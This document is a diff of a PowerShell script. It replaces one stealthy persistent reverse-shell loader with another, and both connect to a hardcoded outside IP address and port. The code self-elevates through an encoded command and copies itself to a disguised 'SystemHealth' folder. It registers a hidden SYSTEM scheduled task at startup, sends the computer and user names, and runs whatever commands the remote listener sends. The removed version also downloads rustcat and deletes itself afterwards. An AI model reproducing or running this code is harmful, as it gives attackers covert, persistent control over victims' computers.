@@ -1,115 +1,175 @@
-# Stealth Rustcat Persistent Loader (Fully Hidden + Auto-Create Path)
-# Save as: $env:TEMP\runtime.tmp.ps1 (will self-relocate and self-delete)
+# Stealthy Persistent Reverse Shell with Auto-Installation
+# Connection Parameters
+$IP = "147.185.221.31"
+$Port = 47034
+$MaxRetries = 1000
+$RetryDelay = 10  # seconds
 
-$serverIP = "147.185.221.31"    # Your listener IP
-$serverPort = 47034             # Your listener port
-$reconnectDelay = 5             # More frequent reconnect attempts
-$installPath = "$env:APPDATA\Microsoft\Windows\SystemHealth"  # Hidden location
-$rustcatPath = "$installPath\rc.exe"
-$payloadPath = "$installPath\runtime.dll"  # Disguised as system file
-$taskName = "WindowsSystemHealthCheck"     # Legitimate-looking task name
+# Installation Paths
+$InstallDir = "$env:ProgramData\Microsoft\Windows\SystemHealth"
+$InstallPath = "$InstallDir\system_health.ps1"
+$TaskName = "SystemHealthMonitor"
 
-# Create installation directory if it doesn't exist :cite[2]:cite[7]
-if (-not (Test-Path -Path $installPath -PathType Container)) {
-    New-Item -Path $installPath -ItemType Directory -Force | Out-Null
-}
-
-# Self-elevate to admin without visible window :cite[1]:cite[3]
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $selfContent = Get-Content -Path $MyInvocation.MyCommand.Definition -Raw
-    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($selfContent))
-    $hiddenProcessArgs = "-ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
-    
-    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $processStartInfo.FileName = "powershell.exe"
-    $processStartInfo.Arguments = $hiddenProcessArgs
-    $processStartInfo.Verb = "runas"
-    $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $processStartInfo.CreateNoWindow = $true
-    
-    [System.Diagnostics.Process]::Start($processStartInfo) | Out-Null
-    exit
-}
-
-# Download and install Rustcat if missing :cite[4]
-if (-not (Test-Path $rustcatPath)) {
-    try {
-        $rustcatURL = "https://github.com/robiot/rustcat/releases/latest/download/rc.exe"
-        Invoke-WebRequest -Uri $rustcatURL -OutFile $rustcatPath -UseBasicParsing -ErrorAction Stop
-    }
-    catch {
-        # Fallback to BitsTransfer if WebRequest fails
-        Start-BitsTransfer -Source $rustcatURL -Destination $rustcatPath -ErrorAction SilentlyContinue
-    }
-}
-
-# Create hidden payload script
-$payloadScript = @"
-while (`$true) {
-    try {
-        if (Test-Path "$rustcatPath") {
-            & "$rustcatPath" $serverIP $serverPort -i -e "cmd.exe"
+function Install-Persistence {
+    # Create installation directory if it doesn't exist
+    if (-not (Test-Path $InstallDir)) {
+        try {
+            New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
+            Write-Output "Created installation directory: $InstallDir"
+        } catch {
+            Write-Output "Failed to create directory: $($_.Exception.Message)"
+            return $false
         }
-        else {
-            # Fallback to PowerShell reverse shell if Rustcat missing
-            `$client = New-Object System.Net.Sockets.TCPClient("$serverIP", $serverPort)
-            `$stream = `$client.GetStream()
-            `$writer = New-Object System.IO.StreamWriter(`$stream)
-            `$reader = New-Object System.IO.StreamReader(`$stream)
-            `$writer.AutoFlush = `$true
+    }
+    
+    # Check if already installed
+    if (Test-Path $InstallPath) {
+        Write-Output "Script already installed at $InstallPath"
+        return $true
+    }
+    
+    # Check for admin privileges
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+    
+    if (-not $isAdmin) {
+        # Attempt to elevate privileges
+        try {
+            $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
+            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
             
-            while (`$true) {
-                `$command = `$reader.ReadLine()
-                if (-not `$command) { break }
-                `$result = iex `$command 2>&1 | Out-String
-                `$writer.Write(`$result)
+            $process = Start-Process PowerShell.exe -ArgumentList "-EncodedCommand $encodedCommand" -Verb RunAs -PassThru -WindowStyle Hidden
+            if ($process.Id) {
+                Write-Output "Elevating privileges for installation..."
+                Start-Sleep -Seconds 5
+                exit 0
+            }
+        } catch {
+            Write-Output "Admin rights required for persistence installation."
+            return $false
+        }
+    }
+    
+    # Copy self to installation path
+    try {
+        $selfContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
+        Set-Content -Path $InstallPath -Value $selfContent -Force
+        Write-Output "Script installed to $InstallPath"
+    } catch {
+        Write-Output "Failed to install script: $($_.Exception.Message)"
+        return $false
+    }
+    
+    # Create scheduled task for persistence
+    try {
+        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -WakeToRun -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        
+        # Register the task
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
+        Write-Output "Persistence installed as scheduled task: $TaskName"
+        return $true
+    } catch {
+        Write-Output "Failed to create scheduled task: $($_.Exception.Message)"
+        return $false
+    }
+}
+
+function Invoke-StealthShell {
+    param($IP, $Port, $MaxRetries, $RetryDelay)
+    
+    $RetryCount = 0
+    while ($RetryCount -lt $MaxRetries) {
+        try {
+            # Create TCP client with timeout
+            $Client = New-Object System.Net.Sockets.TCPClient
+            $Connection = $Client.BeginConnect($IP, $Port, $null, $null)
+            $ConnectionSuccess = $Connection.AsyncWaitHandle.WaitOne(5000, $true)
+            
+            if (!$ConnectionSuccess) {
+                throw "Connection timeout"
+            }
+            
+            $Client.EndConnect($Connection)
+            $Stream = $Client.GetStream()
+            
+            # Send initial beacon
+            $WelcomeMsg = "[+] Connected from $env:COMPUTERNAME as $env:USERNAME`n"
+            $WelcomeBytes = [System.Text.Encoding]::ASCII.GetBytes($WelcomeMsg)
+            $Stream.Write($WelcomeBytes, 0, $WelcomeBytes.Length)
+            $Stream.Flush()
+            
+            # Data buffer
+            [byte[]]$Bytes = 0..65535 | %{0}
+            
+            # Main communication loop
+            while (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
+                $Command = [System.Text.Encoding]::ASCII.GetString($Bytes, 0, $i)
+                
+                # Execute command and capture output
+                try {
+                    $Output = (Invoke-Expression -Command $Command 2>&1 | Out-String)
+                } catch {
+                    $Output = $_.Exception.Message + "`n"
+                }
+                
+                # Send output back
+                $ResponseBytes = ([text.encoding]::ASCII).GetBytes($Output)
+                $Stream.Write($ResponseBytes, 0, $ResponseBytes.Length)
+                $Stream.Flush()
+            }
+            
+            $Client.Close()
+        } catch {
+            # Silent error handling
+        }
+        
+        $RetryCount++
+        Start-Sleep -Seconds $RetryDelay
+    }
+}
+
+# Main execution block
+try {
+    # Stealth Configuration - Hide window and suppress output
+    $WindowStyle = "Hidden"
+    if ($WindowStyle -eq "Hidden") {
+        try {
+            $null = [System.Console]::SetOut([System.IO.TextWriter]::Null)
+        } catch {}
+    }
+    
+    # Check if we're running from installation path
+    $isInstalled = ($MyInvocation.MyCommand.Path -eq $InstallPath)
+    
+    # Install persistence if not already installed
+    if (-not $isInstalled) {
+        $installed = Install-Persistence
+        if ($installed) {
+            # If we just installed, run from installed location
+            if (Test-Path $InstallPath) {
+                Start-Process PowerShell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`"" -WindowStyle Hidden
+                exit 0
             }
         }
     }
-    catch { }
-    Start-Sleep -Seconds $reconnectDelay
+    
+    # Execution Guard - Ensure single instance
+    $MutexName = "Global\RustCatShellMutex"
+    try {
+        $Mutex = New-Object System.Threading.Mutex($false, $MutexName)
+        $HasMutex = $Mutex.WaitOne(0, $false)
+    } catch {
+        $HasMutex = $false
+    }
+    
+    if ($HasMutex) {
+        # Launch the shell
+        Invoke-StealthShell -IP $IP -Port $Port -MaxRetries $MaxRetries -RetryDelay $RetryDelay
+    } else {
+        exit 0
+    }
+} catch {
+    exit 0
 }
-"@
-
-$payloadScript | Out-File -FilePath $payloadPath -Encoding ASCII
-
-# Create completely hidden scheduled task :cite[6]:cite[9]
-$taskAction = New-ScheduledTaskAction -Execute "wscript.exe" `
-    -Argument "`"$installPath\invisible.vbs`""
-$taskTrigger = New-ScheduledTaskTrigger -AtStartup
-$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$taskSettings = New-ScheduledTaskSettingsSet `
-    -AllowStartIfOnBatteries `
-    -DontStopIfGoingOnBatteries `
-    -Hidden `
-    -StartWhenAvailable `
-    -RestartCount 3 `
-    -RestartInterval (New-TimeSpan -Minutes 1)
-
-Register-ScheduledTask -TaskName $taskName `
-    -Action $taskAction `
-    -Trigger $taskTrigger `
-    -Principal $taskPrincipal `
-    -Settings $taskSettings `
-    -Description "Windows System Health Monitoring" `
-    -Force | Out-Null
-
-# Create VBScript wrapper for completely invisible execution :cite[3]
-$vbsScript = @"
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`"", 0, False
-"@
-$vbsScript | Out-File -FilePath "$installPath\invisible.vbs" -Encoding ASCII
-
-# Launch hidden without creating any window
-$vbsLauncher = @"
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`"", 0, False
-"@
-$vbsLauncher | Out-File -FilePath "$env:TEMP\run.vbs" -Encoding ASCII
-Start-Process wscript.exe -ArgumentList "`"$env:TEMP\run.vbs`"" -WindowStyle Hidden
-
-# Self-cleanup of initial file
-Start-Sleep -Seconds 10
-Remove-Item -Path "$env:TEMP\run.vbs" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path $MyInvocation.MyCommand.Definition -Force -ErrorAction SilentlyContinue
